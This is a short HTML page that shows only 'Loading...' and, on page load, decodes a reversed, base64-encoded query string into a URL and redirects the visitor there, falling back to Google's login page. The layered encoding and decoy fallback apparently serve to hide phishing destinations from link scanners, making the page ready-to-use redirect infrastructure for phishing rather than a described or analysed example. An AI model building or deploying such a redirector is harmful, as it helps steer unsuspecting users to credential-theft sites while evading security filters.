<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <script>
    window.onload = function () {
      const reverse = s => s.split('').reverse().join('');
      const isUrl = u => {
        try { new URL(u); return true; } catch { return false; }
      };
      const query = window.location.search.slice(1);
      try {
        const b64 = reverse(decodeURIComponent(query));
        const raw = atob(b64);
        const parts = raw.includes("::") ? raw.split("::")[1] : raw;
        const finalUrl = decodeURIComponent(parts);
        window.location.href = isUrl(finalUrl) ? finalUrl : 'https://www.google.com/login';
      } catch (e) {
        window.location.href = 'https://www.google.com/login';
      }
    };
  </script>
</head>
<body>
  <p>Loading...</p>
</body>
</html>
